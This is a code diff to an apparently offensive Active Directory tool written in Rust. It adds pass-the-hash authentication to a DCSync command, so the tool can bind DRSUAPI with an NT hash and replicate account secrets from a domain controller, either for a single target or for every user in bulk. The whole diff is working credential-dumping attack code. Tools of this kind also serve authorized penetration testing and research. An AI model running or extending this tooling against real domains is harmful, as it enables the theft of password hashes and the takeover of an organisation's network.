@@ -27,6 +27,14 @@ pub(crate) struct DcsyncArgs {
     /// large domain before committing to a full dump.
     #[arg(long)]
     pub limit: Option<usize>,
+    /// **1.5.2 pass-the-hash.** Bind DRSUAPI using an NT hash (32 hex chars) instead of a
+    /// password. Mutually exclusive with `--password`. Same downstream secrets extraction —
+    /// the auth just skips the LmCompatibilityLevel≥3 NTLMv2 password-derived path and uses
+    /// the hash directly. Accepts `@file:/path/to/hash.hex` or `env:VAR` per the standard
+    /// secret-argument convention; a bare 32-hex-char literal is rejected to prevent
+    /// shell-history leakage (this matches `attack rbcd --nt-hash` semantics).
+    #[arg(long, value_name = "HASH")]
+    pub nt_hash: Option<adhammer_core::SecretString>,
 }
 
 /// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
@@ -67,15 +75,44 @@ pub(crate) async fn dcsync(a: DcsyncArgs) -> Result<()> {
 
 async fn dcsync_impl(mut a: DcsyncArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
     use ms_drsr::DrsSession;
-    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
-    checklist.record_ok("resolve password", "resolved");
+    // Auth resolution: NT hash short-circuits the password path (pass-the-hash). Both
+    // paths route through `resolve_secret` so `@file:` / `env:` / secure-prompt work
+    // consistently.
+    let use_pth = a.nt_hash.is_some();
+    if use_pth {
+        let nt = crate::resolve_secret(
+            a.nt_hash.as_ref().expect("checked above"),
+            "ADHAMMER_NT_HASH",
+        )?;
+        a.nt_hash = Some(nt);
+        checklist.record_ok("resolve password", "NT hash (pass-the-hash)");
+    } else {
+        a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
+        checklist.record_ok("resolve password", "resolved");
+    }
 
     if a.all {
         return dcsync_all(&a, checklist).await;
     }
-    let mut sess =
-        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?;
-    checklist.record_ok("DRSUAPI bind", "sealed replication handle");
+    let mut sess = if use_pth {
+        DrsSession::bind_nt_hash(
+            &a.auth.host,
+            &a.auth.domain,
+            &a.auth.user,
+            a.nt_hash.as_ref().unwrap().expose_secret(),
+        )
+        .await?
+    } else {
+        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?
+    };
+    checklist.record_ok(
+        "DRSUAPI bind",
+        if use_pth {
+            "sealed replication handle (pass-the-hash)"
+        } else {
+            "sealed replication handle"
+        },
+    );
     // Task J fix: DsCrackNames uses DS_NT4_ACCOUNT_NAME which expects NETBIOS\name.
     // If the caller passed a DNS domain (`testlab.local`), the CrackNames step
     // returns status 2 (name not found). Auto-normalize the leftmost DNS label
@@ -166,10 +203,27 @@ async fn dcsync_all(a: &DcsyncArgs, checklist: &mut ui::StageChecklist) -> Resul
 
     eprintln!("[+] {} accounts scheduled for replication…", users.len());
 
-    // 2. DCSync each over one sealed DRSUAPI session.
-    let mut sess =
-        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?;
-    checklist.record_ok("DRSUAPI bind", "sealed replication handle");
+    // 2. DCSync each over one sealed DRSUAPI session — pick password vs NT-hash auth
+    // exactly like the single-target path above.
+    let mut sess = if let Some(nt) = a.nt_hash.as_ref() {
+        DrsSession::bind_nt_hash(
+            &a.auth.host,
+            &a.auth.domain,
+            &a.auth.user,
+            nt.expose_secret(),
+        )
+        .await?
+    } else {
+        DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?
+    };
+    checklist.record_ok(
+        "DRSUAPI bind",
+        if a.nt_hash.is_some() {
+            "sealed replication handle (pass-the-hash)"
+        } else {
+            "sealed replication handle"
+        },
+    );
     let (mut ok, mut fail) = (0u32, 0u32);
     for (_rid, name) in &users {
         match sess.dcsync(&netbios_from_dns(&a.auth.domain), name).await {
